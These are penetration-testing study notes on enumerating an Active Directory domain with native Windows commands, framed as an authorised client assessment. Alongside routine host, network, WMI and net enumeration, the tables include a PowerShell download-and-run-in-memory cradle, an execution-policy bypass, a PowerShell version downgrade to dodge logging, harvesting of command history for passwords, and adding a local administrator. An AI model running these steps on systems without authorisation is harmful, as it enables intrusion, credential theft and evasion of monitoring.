**Overview:**
several techniques for utilizing native Windows tools to perform our enumeration.
Let's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to "living off the land" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of "normal" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.
if the hosts are running an older version of PowerShell Notice the difference in the version reported. we have successfully downgrad the shell. Let's check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check

---
## Env Commands For Host & Network Recon


| **Command**                                                                                               | **Result**                                                                                             |
| --------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| `hostname`                                                                                                | Prints the PC's Name                                                                                   |
| `[System.Environment]::OSVersion.Version`                                                                 | Prints out the OS version and revision level                                                           |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                                                   | Prints the patches and hotfixes applied to the host                                                    |
| `ipconfig /all`                                                                                           | Prints out network adapter state and configurations                                                    |
| `set`                                                                                                     | Displays a list of environment variables for the current session (ran from CMD-prompt)                 |
| `echo %USERDOMAIN%`                                                                                       | Displays the domain name to which the host belongs (ran from CMD-prompt)                               |
| `echo %logonserver%`                                                                                      | Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)             |
| [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo). | can cover the information above with one command (put this command above since its the most important) |
	

The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information

## Powershell

| **Cmd-Let**                                                                                                                | **Description**                                                                                                                                                                                                                               |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                                                               | Lists available modules loaded for use.                                                                                                                                                                                                       |
| `Get-ExecutionPolicy -List`                                                                                                | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.                                         |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                                                | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
| `Get-ChildItem Env: \| ft Key,Value`                                                                                       | Return environment values such as key paths, users, computer information, etc.                                                                                                                                                                |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`                                 | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.                       |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory.                                                                                                                                        |
| ```<br> powershell.exe -version 2<br>```                                                                                   | downgrade the powershell version                                                                                                                                                                                                              |
| ```<br>netsh advfirewall show allprofiles<br>```                                                                           | Windows Firewall settings                                                                                                                                                                                                                     |
| ```<br>sc query windefend<br>```                                                                                           | Windows defender settings                                                                                                                                                                                                                     |
| qwinsta                                                                                                                    | check and see if you are the only one logged in                                                                                                                                                                                               |

## Network Information

| **Networking Commands**              | **Description**                                                                                                  |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| `arp -a`                             | Lists all known hosts stored in the arp table.                                                                   |
| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |

## Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.

| \| **Command** \| **Description** \|<br>\| ----------- \| --------------- \|<br>     | desctiption                                                                                            |
| ------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`                              | Prints the patch level and description of the Hotfixes applied                                         |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list                              |
| `wmic process list /format:list`                                                     | A listing of all processes on host                                                                     |
| `wmic ntdomain list /format:list`                                                    | Displays information about the Domain and Domain Controllers                                           |
| `wmic useraccount list /format:list`                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
| `wmic group list /format:list`                                                       | Information about all local groups                                                                     |
| `wmic sysaccount list /format:list`                                                  | Dumps information about any system accounts that are being used as service accounts.                   |

## Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component.

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|
